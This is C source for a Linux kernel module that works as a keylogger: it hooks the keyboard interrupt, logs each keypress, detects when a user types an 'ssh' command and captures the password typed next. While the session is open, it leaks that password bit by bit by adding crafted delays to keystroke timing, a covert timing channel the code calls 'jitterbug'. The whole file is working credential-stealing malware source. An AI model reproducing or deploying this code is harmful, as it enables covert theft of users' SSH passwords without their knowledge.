#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <linux/keyboard.h>
#include <linux/delay.h>
#include <linux/time.h>
#include <linux/init.h>

#include "line.h"

// TODO: Put these in impl header
#define KBD_IRQ      1
#define KBD_DATA_REG 0x60

/* ============= DATA ============= */

static line_t line_current;
static line_t line_previous;
static line_t line_passwd;

typedef enum { IDLE, ENTERING_PASSWD, CONNECTED } state_t;
static state_t state_current = IDLE;

static int jitter_char_idx = 0;
static int jitter_bit_idx = 0;
static bool first_packet = true;

/* Time */
static struct timeval timeval_previous;

/* ============= CODE ============= */

/* COMPARE UTIL */

// Takes two strings, returns true if prefix is prefix of str
bool match_prefix(unsigned char *str, unsigned char *prefix) {
  int i;

  i = 0;

  while (prefix[i] != '\0') {
    if (str[i] != prefix[i]) {
      return false;
    }

    i++;
  }

  return true;
}

/* TIME UTIL */

/* Given two timevals, one later and one earlier, compute elapsed time in milliseconds */
time_t get_milli_diff(struct timeval *later, struct timeval *earlier) {
  time_t elapsed_sec;
  suseconds_t elapsed_micro;

  elapsed_sec = later->tv_sec - earlier->tv_sec;
  elapsed_micro = later->tv_usec - earlier->tv_usec;

  return (elapsed_sec * 1000 + (elapsed_micro / 1000));
}

/* Stateful; Computes elapsed time in milliseconds between now and last time that update_time() was called */
time_t update_time(void) {
  struct timeval timeval_current;
  time_t elapsed_milli;

  do_gettimeofday(&timeval_current);

  elapsed_milli = get_milli_diff(&timeval_current, &timeval_previous);

  timeval_previous = timeval_current;

  return elapsed_milli;
}

/* JITTERBUG UTIL */

void reset_jitter(void) {
  jitter_char_idx = 0;
  jitter_bit_idx = 0;

  first_packet = true;

  return;
}

/* JITTERBUG */

void jitterbug(void) {
  // Current time
  struct timeval timeval_current;

  unsigned char char_to_send;

  // Timing Window
  time_t window = 40;

  time_t elapsed;
  time_t m;

  if (line_passwd.size < jitter_char_idx) { // we've already transmitted the whole password
    return;
  }

  char_to_send = line_passwd.contents[jitter_char_idx];

  if (first_packet) { // Don't delay the first packet, because we don't have a elapsed time yet
    update_time();

    first_packet = false;
    return;
  }

  do_gettimeofday(&timeval_current);
  elapsed = get_milli_diff(&timeval_current, &timeval_previous);

  printk(KERN_INFO "Elapsed (before delay): %ld milli\n", elapsed);

  m = elapsed % window;

  if (char_to_send & (0x01 << (7 - jitter_bit_idx))) { // Send a '1'
    printk(KERN_INFO "!! 1\n");
    mdelay((window - m) + (window / 2));
  } else { // Send a '0'
    printk(KERN_INFO "!! 0\n");
    mdelay(window - m);
  }

  update_time();

  printk(KERN_INFO "Elapsed (after delay): %ld milli\n", get_milli_diff(&timeval_previous, &timeval_current));

  if (jitter_bit_idx == 7) {
    jitter_bit_idx = 0;
    jitter_char_idx++;
  } else {
    jitter_bit_idx++;
  }

  return;
}

irqreturn_t kbd_interrupt(int irq, void *dummy) {
  unsigned char key;

  key = line_put(inb(KBD_DATA_REG), &line_current, &line_previous);

  printk(KERN_INFO "%u pressed!\n", key);

  if (key == SPECIAL_KEY) {
    return IRQ_HANDLED;
  }

  if (state_current == IDLE) {
    if (key == '\n') {
      if (match_prefix(line_previous.contents, "ssh")) {
        printk(KERN_INFO "TRANSITION: IDLE -> ENTERING_PASSWD\n");

        state_current = ENTERING_PASSWD;
      }
    }
  }

  else
  if (state_current == ENTERING_PASSWD) {
    if (key == '\n') {
      printk(KERN_INFO "TRANSITION: ENTERING_PASSWD -> CONNECTED\n");

      copy_line(&line_passwd, &line_previous);

      state_current = CONNECTED;
    }
  }

  else
  if (state_current == CONNECTED) {
    jitterbug();

    if (key == '\n') {
      if (match_prefix(line_previous.contents, "exit")) {
        printk(KERN_INFO "TRANSITION: CONNECTED -> IDLE\n");

        initialize_line(&line_passwd);
        reset_jitter();

        state_current = IDLE;
      }
    }
  }

  return IRQ_HANDLED;
}
  

int __init keylog_init(void) {
  printk(KERN_INFO "Hello, world!\n");

  initialize_line(&line_current);
  initialize_line(&line_previous);
  initialize_line(&line_passwd);

  request_irq(KBD_IRQ, kbd_interrupt, IRQF_SHARED, "keyboard", (void *) kbd_interrupt);

  return 0;
}

void __exit keylog_exit(void) {
  free_irq(KBD_IRQ, (void *) kbd_interrupt);
  printk(KERN_INFO "Goodbye, world!\n");

  return;
}

module_init(keylog_init);
module_exit(keylog_exit);
